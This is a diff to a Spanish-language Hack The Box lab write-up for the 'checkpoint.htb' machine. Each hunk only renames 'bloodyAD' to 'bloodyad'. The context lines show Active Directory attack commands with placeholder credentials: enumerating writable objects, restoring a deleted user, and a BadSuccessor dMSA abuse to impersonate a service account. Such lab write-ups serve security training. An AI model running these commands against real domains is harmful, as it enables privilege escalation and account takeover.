@@ -187,10 +187,10 @@ Cada uno cumple un rol dentro de la ruta de ataque.
 
 El paso clave es identificar qué objetos de Active Directory puede modificar el usuario inicial.
 
-Usamos `bloodyAD`:
+Usamos `bloodyad`:
 
 ```bash
-bloodyAD --host <IP_OBJETIVO> --dns <IP_OBJETIVO> -d checkpoint.htb \
+bloodyad --host <IP_OBJETIVO> --dns <IP_OBJETIVO> -d checkpoint.htb \
   -u alex.turner -p '<password>' get writable
 ```
 
@@ -219,7 +219,7 @@ Active Directory puede conservar objetos eliminados en el contenedor `Deleted Ob
 Restauramos `mark.davies`:
 
 ```bash
-bloodyAD --host <IP_OBJETIVO> --dns <IP_OBJETIVO> -d checkpoint.htb \
+bloodyad --host <IP_OBJETIVO> --dns <IP_OBJETIVO> -d checkpoint.htb \
   -u alex.turner -p '<password>' set restore mark.davies
 ```
 
@@ -301,7 +301,7 @@ Y se revisaría si existe una flag de usuario o archivos de interés.
 También se debe enumerar qué permisos tiene este nuevo usuario dentro del dominio:
 
 ```bash
-bloodyAD --host <IP_OBJETIVO> --dns <IP_OBJETIVO> -d checkpoint.htb \
+bloodyad --host <IP_OBJETIVO> --dns <IP_OBJETIVO> -d checkpoint.htb \
   -u ryan.brooks -p '<password_o_material_obtenido>' get writable
 ```
 
@@ -339,7 +339,7 @@ Desde la información pública del writeup, se crea una dMSA que apunta a `svc_d
 Ejemplo conceptual:
 
 ```bash
-bloodyAD --host <IP_OBJETIVO> --dns <IP_OBJETIVO> -d checkpoint.htb \
+bloodyad --host <IP_OBJETIVO> --dns <IP_OBJETIVO> -d checkpoint.htb \
   -u alex.turner -p '<password>' \
   add badSuccessor '<svc-dmsa>' \
   -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' \
@@ -348,7 +348,7 @@ bloodyAD --host <IP_OBJETIVO> --dns <IP_OBJETIVO> -d checkpoint.htb \
 
 Explicación:
 
-- `add badSuccessor`: usa el helper de bloodyAD para preparar el abuso.
+- `add badSuccessor`: usa el helper de bloodyad para preparar el abuso.
 - `<svc-dmsa>`: nombre de la dMSA controlada por el atacante.
 - `-t`: cuenta objetivo que se desea suplantar/heredar.
 - `--ou`: OU donde se creará la dMSA.
@@ -468,7 +468,7 @@ Desde ahí se obtiene la flag final del laboratorio.
 ```text
 alex.turner
    │
-   ├── Enumera permisos AD con bloodyAD
+   ├── Enumera permisos AD con bloodyad
    │
    ├── Restaura usuario eliminado mark.davies
    │
